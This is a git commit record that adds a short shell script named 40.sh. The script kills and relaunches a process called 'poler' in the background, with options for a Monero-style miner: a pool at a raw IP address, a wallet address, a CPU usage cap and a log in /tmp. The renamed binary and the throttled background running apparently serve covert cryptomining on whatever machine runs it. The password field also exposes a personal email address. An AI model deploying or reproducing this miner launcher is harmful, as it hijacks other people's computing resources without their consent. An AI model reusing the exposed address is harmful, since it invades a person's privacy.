9dfc31c8dd0625f6dd6d7a2ba21db9007525805b
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-07 20:21:31 +0300

    t11

---
+++ 40.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 75 --cpu-priority 3 -o 94.103.81.96:5984 -u 43d7tDnkhtSTX6v1JkpHnjae26tM7kCdDBZFys9zwVAdMwo3dcLyKYP67DjymbW2hc9Hz1fREGKw334YrBBka4MWHHunmiv --pass=t11-salfetochka:lyashko6666@gmail.com -k
